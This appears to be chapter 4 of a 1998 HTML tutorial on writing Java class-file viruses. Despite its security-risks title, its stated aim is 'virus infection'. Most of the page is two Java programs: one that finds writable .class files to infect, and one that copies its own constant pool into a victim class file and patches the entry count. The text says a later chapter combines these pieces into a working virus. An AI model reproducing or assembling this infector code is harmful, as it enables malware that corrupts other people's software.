@@ -1,0 +1,240 @@
+<HTML>
+<HEAD>
+   
+   
+   <TITLE>Security Risks Associated With The Java Platform - Chapter 4</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#FFFFFF" LINK="#000000" VLINK="#000000" ALINK="#000000">
+ 
+<CENTER><TABLE CELLSPACING=0 CELLPADDING=10 WIDTH="600" BGCOLOR="#000000" >
+<TR>
+<TD WIDTH="16%" BACKGROUND="lcbackgr.jpg">
+<CENTER> </CENTER>
+</TD>
+
+<TD BGCOLOR="#FFFFFF">
+<CENTER><IMG SRC="lcstrang.jpg" BGCOLOR="WHITE" HEIGHT=150 WIDTH=300><FONT FACE="Courier New,Courier"> </FONT></CENTER>
+
+<CENTER><FONT FACE="Courier New,Courier">[ chapter 4 ]</FONT></CENTER>
+
+<BLOCKQUOTE><FONT FACE="Courier New,Courier">introduction </FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>With the previous chapters
+you should now have enough knowledge to make java binary class files do
+some weird things. To round off your education it is necessary to understand
+a few things relevant to virus infection</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier">analysis </FONT> 
+<BR> 
+<LI>
+<FONT FACE="Courier New,Courier"><FONT SIZE=-1>finding files</FONT></FONT></LI>
+
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>To infect files you must
+be able to search through a directory listing for suitably named files.
+The code below illustrates how one may go about this.</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>//====================================================</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>// Title:  Find.java</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>// Author: Landing Camel
+International</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>// Date:  
+July 1998</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>//====================================================</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>import java.io.*;</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>public class Find {</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>public static void main(String
+argv[]) {</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1> String homedir
+= System.getProperty("user.dir");</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1> File present =
+new File(homedir);</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1> int ind;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1> String[] dirlist;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1> for (dirlist =
+present.list(), ind = 0;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  dirlist != null
+&amp;&amp; ind &lt; dirlist.length; ind++){</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  File entry =
+new File(present, dirlist[ind]);</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  if ((entry.isFile())
+&amp;&amp; (entry.canWrite()) &amp;&amp; </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+(entry.canRead()) &amp;&amp;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+(dirlist[ind].endsWith(".class"))) {</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+System.out.println(entry.getAbsolutePath());</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  }</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1> }</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>}</FONT></FONT> 
+<BR> 
+<LI>
+<FONT FACE="Courier New,Courier"><FONT SIZE=-1>Reading from host and Writing
+to victim</FONT></FONT></LI>
+
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>It is a waste of valuable
+space to store a copy of the virus inside the virus so that it can attach
+it to other files. Thus we are required to be able to read from the current
+file all of the necessary parts to infect another file. This code illustrates
+how to go about this by reading in its whole constants pool and writing
+it to another file, victim.</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>//====================================================</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>// Title:  host.java</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>// Author: Landing Camel
+International</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>// Date:  
+July 1998</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>//====================================================</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>import java.io.*;</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>public class host {</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1> public static void
+main(String argv[]) </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>       
+throws IOException {</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  //create instance
+for host</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  RandomAccessFile
+host   = new </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>    
+RandomAccessFile("host.class","r");</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  //the length of
+the constants_pool in bytes</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  int cp_length
+= 578;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  int fpointer
+= 10;</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  //read in our
+constant_pool</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  host.seek(fpointer);</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  byte[] cp_pool
+= new byte[cp_length];</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  host.readFully(cp_pool);</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  //create instance
+for victim</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  RandomAccessFile
+victim = new </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>    
+RandomAccessFile("victim.class","rw");</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  //seek to end
+of constants pool</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  //read in const_count</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  fpointer = 8;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  victim.seek(fpointer);</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  int cp_entries
+= victim.readUnsignedShort();</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  //write new constant_count</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  victim.seek(fpointer);</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  victim.writeShort(cp_entries+65);</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  //seek to the
+start of the const_pool</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  fpointer += 2;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  victim.seek(fpointer);</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  //iterate through
+const_pool</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  for (int i =
+1; i &lt; cp_entries; i++) {</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>    
+int tag = victim.readUnsignedByte();</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>    
+fpointer++;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>    
+int skipper = 0;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>    
+switch (tag) {</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 7: </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 8: fpointer += 2;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>             
+break;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 3:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 4:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 9:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 10:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 11:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 12: fpointer = fpointer + 4;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>              
+break;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 5:</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>     
+case 6: fpointer = fpointer + 8;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>             
+i++;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>             
+break;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>    
+case 1: skipper = victim.readUnsignedShort();</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>            
+fpointer = fpointer + skipper + 2;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>            
+break;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>    
+}</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>    
+victim.seek(fpointer); </FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  }</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  //save the end
+of the file</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  int offset =
+(int)victim.length() - fpointer;</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  byte[] end =
+new byte[offset];</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  victim.read(end,
+0, offset);</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  //append our new
+code to the end of the file</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  victim.seek(fpointer);</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  victim.write(cp_pool);</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  //restore tail
+of file</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  victim.write(end);</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  //close files</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  victim.close();</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>  host.close();</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1> }</FONT></FONT> 
+<BR><FONT FACE="Courier New,Courier"><FONT SIZE=-1>}</FONT></FONT> 
+
+<P><FONT FACE="Courier New,Courier">conclusion </FONT> 
+
+<P><FONT FACE="Courier New,Courier"><FONT SIZE=-1>Now your journey is almost
+complete. The next chapter deals with bringing it all together to make
+something cool and also deals with the problem of changing offsets in the
+code and constant pool. This chapter was still important although relatively
+little material was covered. Remember to keep it all in perspective.</FONT></FONT></BLOCKQUOTE>
+<FONT FACE="Courier New,Courier"> </FONT></TD>
+</TR>
+</TABLE></CENTER>
+ 
+</BODY>
+</HTML>
